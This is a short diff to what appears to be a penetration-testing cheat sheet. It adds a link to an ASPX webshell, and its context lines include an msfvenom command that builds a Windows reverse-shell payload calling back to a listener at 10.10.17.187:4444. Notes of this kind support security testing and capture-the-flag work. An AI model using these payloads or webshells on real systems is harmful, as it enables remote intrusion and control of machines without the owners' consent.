@@ -238,6 +238,8 @@
     - msfvenom -p windows/shell_reverse_tcp lhost=10.10.17.187 lport=4444 -b '\x00\x0A\x0D' -f python 
   - .NET
     - [dnspy](https://github.com/dnSpy/dnSpy)
+  - asp/aspx
+    - [aspx webshell](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx)
 
 
 
